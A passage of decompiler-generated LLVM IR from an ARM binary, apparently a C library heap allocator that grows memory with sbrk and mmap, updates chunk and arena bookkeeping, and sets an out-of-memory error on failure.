  %v1_11de8 = sub i32 -1, %v1_11de4
  store i32 %v1_11de8, i32* %fp.global-to-local, align 4
  %v2_11dec = and i32 %v2_11de4, %v1_11de8
  store i32 %v2_11dec, i32* @r5, align 4
  %tmp157 = icmp slt i32 %v2_11dec, 1
  br i1 %tmp157, label %dec_label_pc_11e10, label %dec_label_pc_11dfc

dec_label_pc_11dfc:                               ; preds = %bb156
  store i32 %v2_11dec, i32* %r0.global-to-local, align 4
  %v1_11e00 = call i32 @__GI_sbrk(i32 %v2_11dec)
  store i32 %v1_11e00, i32* %r0.global-to-local, align 4
  %v3_11e04 = icmp eq i32 %v1_11e00, -1
  store i32 %v1_11e00, i32* @r4, align 4
  br i1 %v3_11e04, label %dec_label_pc_11e10, label %dec_label_pc_11e7c

dec_label_pc_11e10:                               ; preds = %dec_label_pc_11dfc, %bb156
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* %r1.global-to-local, align 4
  %v4_11e18 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 64) to i32*), align 4
  store i32 %v4_11e18, i32* %r6.global-to-local, align 4
  %v1_11e1c = add i32 %v4_11e18, 864
  %v2_11e1c = inttoptr i32 %v1_11e1c to i32*
  %v3_11e1c = load i32, i32* %v2_11e1c, align 4
  store i32 %v3_11e1c, i32* %r3.global-to-local, align 4
  %v1_11e20 = urem i32 %v3_11e1c, 2
  %v2_11e20 = icmp eq i32 %v1_11e20, 0
  br i1 %v2_11e20, label %.thread32thread-pre-split, label %bb158

bb158:                                            ; preds = %dec_label_pc_11e10
  %v1_11e24 = load i32, i32* @r8, align 4
  %v2_11e24 = load i32, i32* %sb.global-to-local, align 4
  %v3_11e24 = add i32 %v2_11e24, %v1_11e24
  %v2_11e28 = load i32, i32* @r5, align 4
  %v3_11e28 = add i32 %v3_11e24, %v2_11e28
  store i32 %v3_11e28, i32* %r3.global-to-local, align 4
  %v2_11e2c = load i32, i32* %fp.global-to-local, align 4
  %v3_11e2c = and i32 %v2_11e2c, %v3_11e28
  store i32 %v3_11e2c, i32* @r5, align 4
  br label %.thread32

.thread32thread-pre-split:                        ; preds = %dec_label_pc_11e10
  %v0_11e30.pr = load i32, i32* @r5, align 4
  br label %.thread32

.thread32:                                        ; preds = %.thread32thread-pre-split, %bb158
  %v0_11e30 = phi i32 [ %v0_11e30.pr, %.thread32thread-pre-split ], [ %v3_11e2c, %bb158 ]
  %v2_11e30 = icmp ugt i32 %v0_11e30, 1048575
  br i1 %v2_11e30, label %bb160, label %bb159

bb159:                                            ; preds = %.thread32
  store i32 1048576, i32* @r5, align 4
  br label %bb160

bb160:                                            ; preds = %.thread32, %bb159
  %v0_11e48 = phi i32 [ %v0_11e30, %.thread32 ], [ 1048576, %bb159 ]
  %v1_11e38 = load i32, i32* @sl, align 4
  %tmp217 = icmp ugt i32 %v0_11e48, %v1_11e38
  br i1 %tmp217, label %dec_label_pc_11e40, label %dec_label_pc_120a4

dec_label_pc_11e40:                               ; preds = %bb160
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_11e48, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_11e5c = call i32 @mmap(i32 0, i32 %v0_11e48, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_11e5c, i32* %r0.global-to-local, align 4
  %v3_11e60 = icmp eq i32 %v6_11e5c, -1
  %v8_11e60 = icmp eq i32 %v6_11e5c, -1
  store i32 %v6_11e5c, i32* @r4, align 4
  br i1 %v8_11e60, label %.thread35, label %bb161

bb161:                                            ; preds = %dec_label_pc_11e40
  %v1_11e68 = load i32, i32* %r6.global-to-local, align 4
  %v2_11e68 = add i32 %v1_11e68, 864
  %v3_11e68 = inttoptr i32 %v2_11e68 to i32*
  %v4_11e68 = load i32, i32* %v3_11e68, align 4
  %v2_11e6c = load i32, i32* @r5, align 4
  %v3_11e6c = add i32 %v2_11e6c, %v6_11e5c
  store i32 %v3_11e6c, i32* %r0.global-to-local, align 4
  %v2_11e70 = and i32 %v4_11e68, -2
  store i32 %v2_11e70, i32* %r3.global-to-local, align 4
  store i32 %v2_11e70, i32* %v3_11e68, align 4
  br label %.thread35

.thread35:                                        ; preds = %dec_label_pc_11e40, %bb161
  br i1 %v3_11e60, label %dec_label_pc_11e7c, label %dec_label_pc_11e80

dec_label_pc_11e7c:                               ; preds = %.thread35, %dec_label_pc_11dfc
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11e80

dec_label_pc_11e80:                               ; preds = %.thread35, %dec_label_pc_11e7c
  %v0_11e80 = load i32, i32* @r4, align 4
  %v7_11e80 = icmp eq i32 %v0_11e80, -1
  br i1 %v7_11e80, label %dec_label_pc_120a4, label %dec_label_pc_11e88

dec_label_pc_11e88:                               ; preds = %dec_label_pc_11e80
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* %r2.global-to-local, align 4
  %v4_11e90 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 64) to i32*), align 4
  store i32 %v4_11e90, i32* %ip.global-to-local, align 4
  store i32 %v3_11dc0, i32* %r2.global-to-local, align 4
  %v1_11e98 = add i32 %v4_11e90, 872
  %v2_11e98 = inttoptr i32 %v1_11e98 to i32*
  %v3_11e98 = load i32, i32* %v2_11e98, align 4
  %v1_11e9c = load i32, i32* @r8, align 4
  %v2_11e9c = add i32 %v1_11e9c, %v3_11dc0
  store i32 %v2_11e9c, i32* %r1.global-to-local, align 4
  %v0_11ea0 = load i32, i32* @r5, align 4
  %v2_11ea0 = add i32 %v0_11ea0, %v3_11e98
  store i32 %v2_11ea0, i32* %r3.global-to-local, align 4
  %v9_11ea4 = icmp eq i32 %v0_11e80, %v2_11e9c
  br i1 %v9_11ea4, label %bb162, label %.thread125

.thread125:                                       ; preds = %dec_label_pc_11e88
  store i32 %v2_11ea0, i32* %v2_11e98, align 4
  br label %dec_label_pc_11ec0

bb162:                                            ; preds = %dec_label_pc_11e88
  %v1_11ea8 = load i32, i32* %r0.global-to-local, align 4
  %v8_11ea8 = icmp eq i32 %v1_11ea8, -1
  store i32 %v2_11ea0, i32* %v2_11e98, align 4
  br i1 %v8_11ea8, label %.thread37, label %dec_label_pc_11ec0

.thread37:                                        ; preds = %bb162
  %v1_11eb0 = load i32, i32* @r5, align 4
  %v2_11eb0 = load i32, i32* @r8, align 4
  %v3_11eb0 = add i32 %v2_11eb0, %v1_11eb0
  %v2_11eb4 = or i32 %v3_11eb0, 1
  store i32 %v2_11eb4, i32* %r3.global-to-local, align 4
  %v2_11eb8 = load i32, i32* %r2.global-to-local, align 4
  %v3_11eb8 = add i32 %v2_11eb8, 4
  %v4_11eb8 = inttoptr i32 %v3_11eb8 to i32*
  store i32 %v2_11eb4, i32* %v4_11eb8, align 4
  br label %dec_label_pc_12038

dec_label_pc_11ec0:                               ; preds = %bb162, %.thread125
  %v0_11ec4.pr = load i32, i32* @r8, align 4
  %v0_11ec0 = load i32, i32* %ip.global-to-local, align 4
  %v1_11ec0 = add i32 %v0_11ec0, 864
  %v2_11ec0 = inttoptr i32 %v1_11ec0 to i32*
  %v3_11ec0 = load i32, i32* %v2_11ec0, align 4
  store i32 %v3_11ec0, i32* %r2.global-to-local, align 4
  %v2_11ec4 = icmp eq i32 %v0_11ec4.pr, 0
  br i1 %v2_11ec4, label %.thread40, label %.thread39

.thread40:                                        ; preds = %dec_label_pc_11ec0
  store i32 0, i32* %r3.global-to-local, align 4
  br label %.thread43

.thread39:                                        ; preds = %dec_label_pc_11ec0
  %v2_11ecc = urem i32 %v3_11ec0, 2
  store i32 %v2_11ecc, i32* %r3.global-to-local, align 4
  %v2_11ed0 = icmp eq i32 %v2_11ecc, 0
  br i1 %v2_11ed0, label %.thread43, label %dec_label_pc_11ed8

dec_label_pc_11ed8:                               ; preds = %.thread39
  %v0_11ed8 = load i32, i32* @r4, align 4
  %v1_11ed8 = load i32, i32* %r1.global-to-local, align 4
  %v3_11ed8 = icmp ult i32 %v0_11ed8, %v1_11ed8
  br i1 %v3_11ed8, label %bb163, label %.thread43

bb163:                                            ; preds = %dec_label_pc_11ed8
  %v2_11edc = and i32 %v3_11ec0, -2
  store i32 %v2_11edc, i32* %r3.global-to-local, align 4
  store i32 %v2_11edc, i32* %v2_11ec0, align 4
  br label %.thread43

.thread43:                                        ; preds = %dec_label_pc_11ed8, %.thread40, %.thread39, %bb163
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* %ip.global-to-local, align 4
  %v4_11eec = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 64) to i32*), align 4
  store i32 %v4_11eec, i32* @r7, align 4
  %v1_11ef0 = add i32 %v4_11eec, 864
  %v2_11ef0 = inttoptr i32 %v1_11ef0 to i32*
  %v3_11ef0 = load i32, i32* %v2_11ef0, align 4
  store i32 %v3_11ef0, i32* %r3.global-to-local, align 4
  %v1_11ef4 = urem i32 %v3_11ef0, 2
  store i32 %v1_11ef4, i32* @r6, align 4
  %v2_11ef4 = icmp eq i32 %v1_11ef4, 0
  br i1 %v2_11ef4, label %dec_label_pc_11f88, label %dec_label_pc_11efc

dec_label_pc_11efc:                               ; preds = %.thread43
  %v0_11efc = load i32, i32* @r8, align 4
  %v2_11efc = icmp eq i32 %v0_11efc, 0
  br i1 %v2_11efc, label %.thread46, label %bb164

bb164:                                            ; preds = %dec_label_pc_11efc
  %v2_11f00 = add i32 %v4_11eec, 872
  %v3_11f00 = inttoptr i32 %v2_11f00 to i32*
  %v4_11f00 = load i32, i32* %v3_11f00, align 4
  store i32 %v4_11f00, i32* %r2.global-to-local, align 4
  %v1_11f04 = load i32, i32* %r1.global-to-local, align 4
  %v2_11f04 = load i32, i32* @r4, align 4
  %v3_11f04 = sub i32 %v2_11f04, %v1_11f04
  %v3_11f08 = add i32 %v3_11f04, %v4_11f00
  store i32 %v3_11f08, i32* %r3.global-to-local, align 4
  store i32 %v3_11f08, i32* %v3_11f00, align 4
  br label %.thread46

.thread46:                                        ; preds = %dec_label_pc_11efc, %bb164
  %v0_11f10 = load i32, i32* @r4, align 4
  %v1_11f10 = urem i32 %v0_11f10, 8
  store i32 %v1_11f10, i32* %r3.global-to-local, align 4
  %v2_11f10 = icmp eq i32 %v1_11f10, 0
  br i1 %v2_11f10, label %.thread47, label %bb165

bb165:                                            ; preds = %.thread46
  %v2_11f14 = sub nsw i32 8, %v1_11f10
  store i32 %v2_11f14, i32* %r3.global-to-local, align 4
  %v3_11f18 = add i32 %v2_11f14, %v0_11f10
  store i32 %v3_11f18, i32* @r7, align 4
  br label %.thread47

.thread47:                                        ; preds = %.thread46, %bb165
  %v0_11f20 = phi i32 [ 0, %.thread46 ], [ %v2_11f14, %bb165 ]
  %v1_11f1c = load i32, i32* @r5, align 4
  %v2_11f1c = add i32 %v1_11f1c, %v0_11f10
  store i32 %v2_11f1c, i32* @r6, align 4
  %v1_11f20 = load i32, i32* @r8, align 4
  %v2_11f20 = add i32 %v2_11f1c, %v0_11f20
  %v2_11f24 = add i32 %v2_11f20, %v1_11f20
  store i32 %v2_11f24, i32* %r1.global-to-local, align 4
  %v1_11f28 = load i32, i32* %sb.global-to-local, align 4
  %v2_11f28 = add i32 %v1_11f28, %v2_11f24
  %v1_11f2c = load i32, i32* %fp.global-to-local, align 4
  %v2_11f2c = and i32 %v1_11f2c, %v2_11f28
  store i32 %v2_11f2c, i32* %r2.global-to-local, align 4
  %v2_11f30 = sub i32 0, %v2_11f1c
  store i32 %v2_11f30, i32* %r3.global-to-local, align 4
  %v2_11f34 = sub i32 %v2_11f2c, %v2_11f1c
  store i32 %v2_11f34, i32* @r5, align 4
  store i32 %v2_11f34, i32* %r0.global-to-local, align 4
  br i1 %v2_11f10, label %bb166, label %bb167

bb166:                                            ; preds = %.thread47
  store i32 %v0_11f10, i32* @r7, align 4
  br label %bb167

bb167:                                            ; preds = %.thread47, %bb166
  %v1_11f40 = call i32 @__GI_sbrk(i32 %v2_11f34)
  store i32 %v1_11f40, i32* %r0.global-to-local, align 4
  %v3_11f44 = icmp eq i32 %v1_11f40, -1
  br i1 %v3_11f44, label %dec_label_pc_11f4c, label %dec_label_pc_11f5c

dec_label_pc_11f4c:                               ; preds = %bb167
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_11f50 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_11f50, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_11fb4

dec_label_pc_11f5c:                               ; preds = %bb167
  %v1_11f5c = load i32, i32* @r4, align 4
  %v3_11f5c = icmp ult i32 %v1_11f40, %v1_11f5c
  br i1 %v3_11f5c, label %dec_label_pc_11f64, label %dec_label_pc_11fb4

dec_label_pc_11f64:                               ; preds = %dec_label_pc_11f5c
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* %r0.global-to-local, align 4
  %v4_11f6c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 64) to i32*), align 4
  store i32 %v4_11f6c, i32* %r2.global-to-local, align 4
  %v1_11f70 = add i32 %v4_11f6c, 864
  %v2_11f70 = inttoptr i32 %v1_11f70 to i32*
  %v3_11f70 = load i32, i32* %v2_11f70, align 4
  %v0_11f74 = load i32, i32* @r6, align 4
  store i32 %v0_11f74, i32* %r0.global-to-local, align 4
  %v1_11f78 = and i32 %v3_11f70, -2
  store i32 %v1_11f78, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_11f78, i32* %v2_11f70, align 4
  br label %dec_label_pc_11fb4

dec_label_pc_11f88:                               ; preds = %.thread43
  %v0_11f88 = load i32, i32* %r0.global-to-local, align 4
  %v3_11f88 = icmp eq i32 %v0_11f88, -1
  br i1 %v3_11f88, label %dec_label_pc_11f90, label %dec_label_pc_11fac

dec_label_pc_11f90:                               ; preds = %dec_label_pc_11f88
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_11f94 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_11f94, i32* %r0.global-to-local, align 4
  %v0_11f98 = load i32, i32* @r7, align 4
  %v1_11f98 = add i32 %v0_11f98, 872
  %v2_11f98 = inttoptr i32 %v1_11f98 to i32*
  %v3_11f98 = load i32, i32* %v2_11f98, align 4
  store i32 %v3_11f98, i32* %r2.global-to-local, align 4
  %v0_11f9c = load i32, i32* @r4, align 4
  %v0_11fa0 = load i32, i32* @r5, align 4
  %v2_11f9c = add i32 %v3_11f98, %v1_11f94
  %v2_11fa0 = sub i32 %v2_11f9c, %v0_11f9c
  %v2_11fa4 = sub i32 %v2_11fa0, %v0_11fa0
  store i32 %v2_11fa4, i32* %r3.global-to-local, align 4
  store i32 %v2_11fa4, i32* %v2_11f98, align 4
  %v0_11fb0.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_11fac

dec_label_pc_11fac:                               ; preds = %dec_label_pc_11f88, %dec_label_pc_11f90
  %v0_11fb0 = phi i32 [ 0, %dec_label_pc_11f88 ], [ %v0_11fb0.pre, %dec_label_pc_11f90 ]
  %v0_11fac = load i32, i32* @r4, align 4
  store i32 %v0_11fac, i32* @r7, align 4
  store i32 %v0_11fb0, i32* @r5, align 4
  br label %dec_label_pc_11fb4

dec_label_pc_11fb4:                               ; preds = %dec_label_pc_11f5c, %dec_label_pc_11f64, %dec_label_pc_11f4c, %dec_label_pc_11fac
  %v0_11fb4 = load i32, i32* %r0.global-to-local, align 4
  %v7_11fb4 = icmp eq i32 %v0_11fb4, -1
  br i1 %v7_11fb4, label %dec_label_pc_12038, label %dec_label_pc_11fbc

dec_label_pc_11fbc:                               ; preds = %dec_label_pc_11fb4
  %v1_11fbc = load i32, i32* @r5, align 4
  %v2_11fbc = add i32 %v1_11fbc, %v0_11fb4
  %v0_11fc0 = load i32, i32* @r7, align 4
  %v2_11fc0 = sub i32 %v2_11fbc, %v0_11fc0
  %v1_11fc4 = or i32 %v2_11fc0, 1
  %v2_11fc8 = add i32 %v0_11fc0, 4
  %v3_11fc8 = inttoptr i32 %v2_11fc8 to i32*
  store i32 %v1_11fc4, i32* %v3_11fc8, align 4
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* %r1.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_11fd4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 64) to i32*), align 4
  store i32 %v4_11fd4, i32* @r6, align 4
  %v1_11fd8 = add i32 %v4_11fd4, 872
  %v2_11fd8 = inttoptr i32 %v1_11fd8 to i32*
  %v3_11fd8 = load i32, i32* %v2_11fd8, align 4
  %v0_11fdc = load i32, i32* @r8, align 4
  %v2_11fdc = icmp eq i32 %v0_11fdc, 0
  %v0_11fe0 = load i32, i32* @r5, align 4
  %v2_11fe0 = add i32 %v0_11fe0, %v3_11fd8
  store i32 %v2_11fe0, i32* %r3.global-to-local, align 4
  store i32 %v2_11fe0, i32* %v2_11fd8, align 4
  %v0_11fe8 = load i32, i32* @r7, align 4
  %v1_11fe8 = load i32, i32* @r6, align 4
  %v2_11fe8 = add i32 %v1_11fe8, 44
  %v3_11fe8 = inttoptr i32 %v2_11fe8 to i32*
  store i32 %v0_11fe8, i32* %v3_11fe8, align 4
  br i1 %v2_11fdc, label %dec_label_pc_12038, label %dec_label_pc_11ff0

dec_label_pc_11ff0:                               ; preds = %dec_label_pc_11fbc
  %v0_11ff4 = load i32, i32* @r8, align 4
  %v1_11ff4 = add i32 %v0_11ff4, -12
  %v1_11ff8 = and i32 %v1_11ff4, -8
  store i32 %v3_11dc0, i32* %ip.global-to-local, align 4
  %v2_12000 = add i32 %v1_11ff8, %v3_11dc0
  store i32 %v2_12000, i32* %r1.global-to-local, align 4
  %v2_12004 = icmp ugt i32 %v1_11ff8, 14
  store i32 5, i32* %r2.global-to-local, align 4
  %v1_1200c = or i32 %v1_11ff8, 1
  store i32 %v1_1200c, i32* %r3.global-to-local, align 4
  store i32 %v1_1200c, i32* %v2_11dcc, align 4
  %v0_12014 = load i32, i32* %r2.global-to-local, align 4
  %v1_12014 = load i32, i32* %r1.global-to-local, align 4
  %v2_12014 = add i32 %v1_12014, 8
  %v3_12014 = inttoptr i32 %v2_12014 to i32*
  store i32 %v0_12014, i32* %v3_12014, align 4
  %v0_12018 = load i32, i32* %r2.global-to-local, align 4
  %v1_12018 = load i32, i32* %r1.global-to-local, align 4
  %v2_12018 = add i32 %v1_12018, 4
  %v3_12018 = inttoptr i32 %v2_12018 to i32*
  store i32 %v0_12018, i32* %v3_12018, align 4
  br i1 %v2_12004, label %dec_label_pc_12020, label %dec_label_pc_12038

dec_label_pc_12020:                               ; preds = %dec_label_pc_11ff0
  %v0_12020 = load i32, i32* @r6, align 4
  %v1_12020 = add i32 %v0_12020, 836
  %v2_12020 = inttoptr i32 %v1_12020 to i32*
  %v3_12020 = load i32, i32* %v2_12020, align 4
  store i32 %v3_12020, i32* @r4, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_12028 = load i32, i32* %ip.global-to-local, align 4
  %v1_12028 = add i32 %v0_12028, 8
  store i32 %v1_12028, i32* @r0, align 4
  store i32 -1, i32* %v2_12020, align 4
  %v0_12030 = call i32 @free()
  store i32 %v0_12030, i32* %r0.global-to-local, align 4
  %v0_12034 = load i32, i32* @r4, align 4
  %v1_12034 = load i32, i32* @r6, align 4
  %v2_12034 = add i32 %v1_12034, 836
  %v3_12034 = inttoptr i32 %v2_12034 to i32*
  store i32 %v0_12034, i32* %v3_12034, align 4
  br label %dec_label_pc_12038

dec_label_pc_12038:                               ; preds = %.thread37, %dec_label_pc_11ff0, %dec_label_pc_11fbc, %dec_label_pc_11fb4, %dec_label_pc_12020
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* %r0.global-to-local, align 4
  %v4_12040 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 64) to i32*), align 4
  store i32 %v4_12040, i32* %lr.global-to-local, align 4
  %v1_12044 = add i32 %v4_12040, 872
  store i32 %v1_12044, i32* %r1.global-to-local, align 4
  %v1_12048 = inttoptr i32 %v1_12044 to i32*
  %v2_12048 = load i32, i32* %v1_12048, align 4
  store i32 %v2_12048, i32* %r1.global-to-local, align 4
  %v3_12048 = add i32 %v4_12040, 876
  %v4_12048 = inttoptr i32 %v3_12048 to i32*
  %v5_12048 = load i32, i32* %v4_12048, align 4
  store i32 %v5_12048, i32* %r3.global-to-local, align 4
  %v1_12050 = add i32 %v4_12040, 868
  %v2_12050 = inttoptr i32 %v1_12050 to i32*
  %v3_12050 = load i32, i32* %v2_12050, align 4
  store i32 %v3_12050, i32* %r3.global-to-local, align 4
  %v1_12054 = add i32 %v4_12040, 884
  %v2_12054 = inttoptr i32 %v1_12054 to i32*
  %v3_12054 = load i32, i32* %v2_12054, align 4
  store i32 %v3_12054, i32* %r2.global-to-local, align 4
  %v2_12058 = add i32 %v3_12050, %v2_12048
  store i32 %v2_12058, i32* %r3.global-to-local, align 4
  %tmp218 = icmp ugt i32 %v2_12048, %v5_12048
  br i1 %tmp218, label %bb168, label %bb169

bb168:                                            ; preds = %dec_label_pc_12038
  store i32 %v2_12048, i32* %v4_12048, align 4
  %v0_12060.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_12060.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb169

bb169:                                            ; preds = %dec_label_pc_12038, %bb168
  %v1_12060 = phi i32 [ %v3_12054, %dec_label_pc_12038 ], [ %v1_12060.pre, %bb168 ]
  %v4_12064 = phi i32 [ %v2_12058, %dec_label_pc_12038 ], [ %v0_12060.pre, %bb168 ]
  %tmp219 = icmp ugt i32 %v4_12064, %v1_12060
  br i1 %tmp219, label %bb170, label %bb171

bb170:                                            ; preds = %bb169
  %v5_12064 = load i32, i32* %lr.global-to-local, align 4
  %v6_12064 = add i32 %v5_12064, 884
  %v7_12064 = inttoptr i32 %v6_12064 to i32*
  store i32 %v4_12064, i32* %v7_12064, align 4
  br label %bb171

bb171:                                            ; preds = %bb169, %bb170
  %v0_12068 = load i32, i32* %lr.global-to-local, align 4
  %v1_12068 = add i32 %v0_12068, 44
  %v2_12068 = inttoptr i32 %v1_12068 to i32*
  %v3_12068 = load i32, i32* %v2_12068, align 4
  store i32 %v3_12068, i32* %ip.global-to-local, align 4
  %v1_1206c = add i32 %v3_12068, 4
  %v2_1206c = inttoptr i32 %v1_1206c to i32*
  %v3_1206c = load i32, i32* %v2_1206c, align 4
  store i32 %v1_11c80, i32* %r1.global-to-local, align 4
  %v1_12074 = and i32 %v3_1206c, -4
  store i32 %v1_12074, i32* %r3.global-to-local, align 4
  %v3_12078 = icmp ult i32 %v1_12074, %v1_11c80
  br i1 %v3_12078, label %dec_label_pc_120a4, label %dec_label_pc_12080

dec_label_pc_12080:                               ; preds = %bb171
  %v0_12080 = load i32, i32* @sl, align 4
  %v2_12080 = sub i32 %v1_12074, %v0_12080
  %v2_12084 = add i32 %v0_12080, %v3_12068
  store i32 %v2_12084, i32* %r1.global-to-local, align 4
  %v1_12088 = or i32 %v2_12080, 1
  store i32 %v1_12088, i32* %r3.global-to-local, align 4
  %v1_1208c = or i32 %v0_12080, 1
  store i32 %v1_1208c, i32* %r2.global-to-local, align 4
  %v1_12090 = add i32 %v3_12068, 8
  store i32 %v1_12090, i32* %r0.global-to-local, align 4
  store i32 %v1_1208c, i32* %v2_1206c, align 4
  %v0_12098 = load i32, i32* %r1.global-to-local, align 4
  %v1_12098 = load i32, i32* %lr.global-to-local, align 4
  %v2_12098 = add i32 %v1_12098, 44
  %v3_12098 = inttoptr i32 %v2_12098 to i32*
  store i32 %v0_12098, i32* %v3_12098, align 4
  %v0_1209c = load i32, i32* %r3.global-to-local, align 4
  %v1_1209c = load i32, i32* %r1.global-to-local, align 4
  %v2_1209c = add i32 %v1_1209c, 4
  %v3_1209c = inttoptr i32 %v2_1209c to i32*
  store i32 %v0_1209c, i32* %v3_1209c, align 4
  br label %dec_label_pc_120bc

dec_label_pc_120a4:                               ; preds = %bb160, %bb171, %dec_label_pc_11e80
  store i32 ptrtoint (i32* @global_var_f45c.425 to i32), i32* %r3.global-to-local, align 4
  %v0_120a8 = call i32 @__aeabi_read_tp()
  %v3_120ac = load i16, i16* @global_var_21510.336, align 2
  %v4_120ac = sext i16 %v3_120ac to i32
  store i32 %v4_120ac, i32* %r3.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v3_120b4 = add i32 %v4_120ac, %v0_120a8
  %v4_120b4 = inttoptr i32 %v3_120b4 to i32*
  store i32 12, i32* %v4_120b4, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_120bc

dec_label_pc_120bc:                               ; preds = %bb154, %bb153, %dec_label_pc_12080, %dec_label_pc_11cc8, %dec_label_pc_120a4
  %v0_120bc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_120bc, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_120c0

dec_label_pc_120c0:                               ; preds = %.thread4, %dec_label_pc_11c94, %.thread124, %dec_label_pc_11b04, %dec_label_pc_11af8, %dec_label_pc_11960, %dec_label_pc_118e4, %dec_label_pc_120bc
  store i32 %v2_11804, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  store i32 44, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* %r2.global-to-local, align 4
  %v4_120d0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 44) to i32*), align 4
  store i32 %v4_120d0, i32* @ip, align 4
  store i32 73948, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_120d0)
  br label %dec_label_pc_120dc

dec_label_pc_120dc:                               ; preds = %dec_label_pc_1183c, %dec_label_pc_120c0
  %v0_120dc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_120dc, i32* %r0.global-to-local, align 4
  store i32 %v3_117d8, i32* @r4, align 4
  store i32 %v6_117d8, i32* @r5, align 4
  store i32 %v9_117d8, i32* @r6, align 4
  store i32 %v12_117d8, i32* @r7, align 4
  store i32 %v15_117d8, i32* @r8, align 4
  store i32 %v18_117d8, i32* @sb, align 4
  store i32 %v21_117d8, i32* @sl, align 4
  store i32 %v24_117d8, i32* @fp, align 4
  store i32 %v27_117d8, i32* @lr, align 4
  ret i32 %v0_120dc

; uselistorder directives
  uselistorder i32 %v0_12080, { 1, 0, 2 }
  uselistorder i32 %v3_12068, { 1, 0, 2, 3 }
  uselistorder i32 %v4_12064, { 1, 0 }
  uselistorder i32 %v2_12048, { 2, 0, 1, 3 }
  uselistorder i32 %v4_12040, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_11ff8, { 1, 2, 0 }
  uselistorder i32 %v0_11fc0, { 1, 0 }
  uselistorder i32 %v0_11fb4, { 1, 0 }
  uselistorder i32 %v2_11fa4, { 1, 0 }
  uselistorder i32 %v2_11f34, { 2, 1, 0 }
  uselistorder i32 %v2_11f1c, { 1, 2, 0, 3 }
  uselistorder i32 %v2_11f14, { 1, 0, 2 }
  uselistorder i32 %v1_11f10, { 2, 1, 0 }
  uselistorder i32 %v0_11f10, { 3, 1, 2, 0 }
  uselistorder i32 %v1_11ef4, { 1, 0 }
  uselistorder i32 %v2_11ecc, { 1, 0 }
  uselistorder i32 %v3_11ec0, { 1, 0, 2 }
  uselistorder i32 %v2_11ea0, { 1, 0, 2 }
  uselistorder i32* %v2_11e98, { 1, 0, 2 }
  uselistorder i32 %v0_11e80, { 1, 0 }
  uselistorder i32 %v6_11e5c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_11e48, { 2, 1, 0 }
  uselistorder i32 %v0_11e30, { 1, 0 }
  uselistorder i32 %v2_11dec, { 1, 0, 2, 3 }
  uselistorder i32 %v1_11de8, { 1, 0 }
  uselistorder i32 %v3_11dc0, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32 %v2_11da0, { 1, 0, 2 }
  uselistorder i32 %v2_11d88, { 1, 2, 0, 3 }
  uselistorder i32 %v1_11d30, { 2, 1, 0 }
  uselistorder i32 %v6_11d24, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32 %v3_11d00, { 2, 1, 0, 3 }
  uselistorder i32 %v3_11cc0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_11c80, { 5, 6, 7, 0, 1, 8, 3, 2, 4, 9 }
  uselistorder i32 %v3_11c78, { 1, 0, 2, 3 }
  uselistorder i32 %v4_11c74, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v0_11c60, { 1, 0 }
  uselistorder i32 %v7_11c20, { 1, 0 }
  uselistorder i32 %v4_11c20, { 1, 0 }
  uselistorder i32 %v0_11bf0, { 1, 0 }
  uselistorder i32 %v2_11bc4, { 3, 2, 1, 0 }
  uselistorder i32 %ip.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_11bc057, { 1, 0 }
  uselistorder i32 %v1_11b8c, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v1_11b74., { 1, 2, 0 }
  uselistorder i32 %v0_11b7c, { 0, 1, 3, 2 }
  uselistorder i32 %v1_11b7c, { 1, 0 }
  uselistorder i32 %v3_11b5c, { 1, 0 }
